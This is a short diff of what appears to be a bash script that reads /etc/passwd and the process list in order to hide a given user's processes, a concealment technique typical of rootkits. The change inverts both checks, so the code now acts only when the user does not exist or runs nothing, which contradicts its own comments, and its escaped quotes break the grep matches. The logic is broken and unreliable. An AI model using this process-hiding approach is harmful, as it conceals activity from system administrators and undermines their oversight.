@@ -153,9 +153,9 @@ do
 				fi
 				
 				# check if the user exists
-				if [[ $(cat /etc/passwd | cut -d: -f1 | grep -w \"$user\") ]]; then
+				if [ ! $(cat /etc/passwd | cut -d: -f1 | grep -w \"$user\") ]; then
 					# check if the user is running any processes
-					if [[ $(ps -ef | awk '{print $1}' | grep -w \"$user\") ]]; then
+					if [ ! $(ps -ef | awk '{print $1}' | grep -w \"$user\") ]; then
 						printf "Hiding $user's processes...\n"
 						
 						# get the PIDs from the process list
